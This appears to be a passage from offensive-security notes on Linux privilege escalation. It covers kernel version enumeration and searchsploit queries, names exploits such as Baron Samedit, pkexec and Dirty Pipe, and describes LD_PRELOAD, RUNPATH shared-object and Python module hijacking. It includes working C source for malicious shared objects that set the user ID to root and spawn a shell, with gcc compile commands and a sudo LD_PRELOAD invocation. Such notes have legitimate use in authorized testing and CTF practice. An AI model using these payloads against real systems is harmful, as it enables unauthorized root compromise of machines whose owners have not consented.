 *  Exploit Kernel vulnerabilities:
	* Get OS and version: `cat /etc/issue`
	* Get kernel version: `uname -r`
	* Get system architecture: `arch`
	* Get distribution release: `cat /etc/lsb-release`
	* Using the information gathered, search for a kernel exploit in searchsploit. Example: `searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"`
	* Do google search and search on github as well.
* Some more exploit worth checking: 
	* Sudo Baron Samedit, sudo policy bypass, `sudo -u#-1` exploit.
	* Polkit pkexec
	* Dirty Pipe
	* Netfilter
* Shared Libraries:
	* LD_PRELOAD technique:
		* Assuming a binary that is run with root privileges and has LD_PRELOAD enabled in its environment for the execution of binary, then it is possible to write a shared object that can be preloaded  when the binary starts.
		* Code for the shared object: 
			```c
			#include <stdio.h>
			#include <sys/types.h>
			#include <stdlib.h>
			
			void _init() {
			unsetenv("LD_PRELOAD");
			setgid(0);
			setuid(0);
			system("/bin/bash");
			}
			```
		* Compiling the shared object: `gcc -fPIC -shared -o root.so root.c -nostartfiles`
		* As an example if an executable can be executed as sudo: `sudo LD_PRELOAD=<path to malicious shared object> executable command`
	* Shared object hijacking:
		* List shared object loaded by binary: `ldd <binary>`
		* Check for any RUNPATH configuration which allows loading shared libraries from custom locations: `readelf -d <binary>  | grep PATH`
		* Assuming if its possible to write a shared file that can be loaded from the RUNPATH directory then shared object hijacking is possible.
		* Find out what function from the shared object is executed by the binary.
			* Try `strings`, decompiling the shared object.
			* Try replacing the shared object and see what function it tries to execute from the shared object using the error it generates.
		* Write malicious code for the function in the shared object:
			```c
			#include<stdio.h>
			#include<stdlib.h>
			
			void <function name>() {
			    printf("Malicious library loaded\n");
			    setuid(0);
			    system("/bin/sh -p");
			} 
			```
		* Compile the shared object: `gcc <source file> -fPIC -shared -o <shared object path from RUNPATH>`
		* Have a high privileged process/service/cron/sticky bit execute the binary.
	* Python Library Hijacking:
		* Wrong write permissions on python module
			* Get module installation location: `pip3 show <module>`
			* Find files from module by function: `grep -r "def <function name>" <module installation directory>/*`
			* Based on function calls of module from a python script find a writable file related to the module and modify it to include a malicious command so that when the python script is executed with root privileges the modified module file executes a malicious command.
		* Library Path:
			* Get python path listing: `python3 -c 'import sys; print("\n".join(sys.path))'`
			* Get module installation location: `pip3 show <module>`
			* The top most to bottom most in the list is the order python looks for modules.
			* If a module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable and its possible write to a path that is higher priority on the list then it is possible to make a highly privilege python script process load a malicious module.
		* PYTHONPATH environment variable
			* If the PYTHONPATH variable is somehow modifiable then it is possible to set it another directory: `PYTHONPATH=/tmp` then write a malicious module in `/tmp` that will then be loaded by a highly privilege python script process